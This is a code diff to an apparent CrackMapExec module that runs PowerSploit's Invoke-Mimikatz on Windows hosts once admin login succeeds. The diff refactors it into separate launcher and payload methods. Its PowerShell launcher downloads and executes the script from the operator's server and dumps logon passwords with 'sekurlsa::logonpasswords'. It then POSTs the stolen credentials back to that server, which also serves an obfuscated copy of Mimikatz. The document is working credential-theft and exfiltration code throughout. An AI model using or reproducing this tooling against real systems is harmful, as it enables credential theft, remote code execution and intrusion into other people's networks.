@@ -1,4 +1,4 @@
-from cme.helpers import create_ps_command, get_ps_script, obfs_ps_script, gen_random_string, validate_ntlm, write_log
+from cme.helpers import create_ps_command, get_ps_script, obfs_ps_script, validate_ntlm, write_log
 from datetime import datetime
 import re
 
@@ -12,25 +12,24 @@ class CMEModule:
 
     description = "Executes PowerSploit's Invoke-Mimikatz.ps1 script"
 
+    chain_support = False
+
     def options(self, context, module_options):
         '''
            COMMAND Mimikatz command to execute (default: 'sekurlsa::logonpasswords')
         '''
 
-        self.mimikatz_command = 'privilege::debug sekurlsa::logonpasswords exit'
+        self.command = 'privilege::debug sekurlsa::logonpasswords exit'
 
         if module_options and 'COMMAND' in module_options:
-            self.mimikatz_command = module_options['COMMAND']
+            self.command = module_options['COMMAND']
 
         #context.log.debug("Mimikatz command: '{}'".format(self.mimikatz_command))
 
-        self.obfs_name = gen_random_string()
-
-    def on_admin_login(self, context, connection):
-
-        payload = '''
+    def launcher(self, context, command):
+        launcher = '''
         IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-Mimikatz.ps1');
-        $creds = Invoke-{func_name} -Command '{command}';
+        $creds = Invoke-Mimikatz -Command '{command}';
         $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
         $request.Method = 'POST';
         $request.ContentType = 'application/x-www-form-urlencoded';
@@ -42,22 +41,24 @@ class CMEModule:
         $request.GetResponse();'''.format(server=context.server, 
                                           port=context.server_port, 
                                           addr=context.localip,
-                                          func_name=self.obfs_name,
-                                          command=self.mimikatz_command)
+                                          command=command)
+        
+        return create_ps_command(launcher)
 
-        context.log.debug('Payload: {}'.format(payload))
-        payload = create_ps_command(payload)
-        connection.execute(payload)
-        context.log.success('Executed payload')
+    def payload(self, context, command):
+        with open(get_ps_script('Invoke-Mimikatz.ps1'), 'r') as ps_script:
+            return obfs_ps_script(ps_script.read())
 
-    def on_request(self, context, request):
+    def on_admin_login(self, context, connection, launcher, payload):
+        connection.execute(launcher)
+        context.log.success('Executed launcher')
+
+    def on_request(self, context, request, launcher, payload):
         if 'Invoke-Mimikatz.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('Invoke-Mimikatz.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
-                request.wfile.write(ps_script)
+            request.wfile.write(payload)
 
         else:
             request.send_response(404)
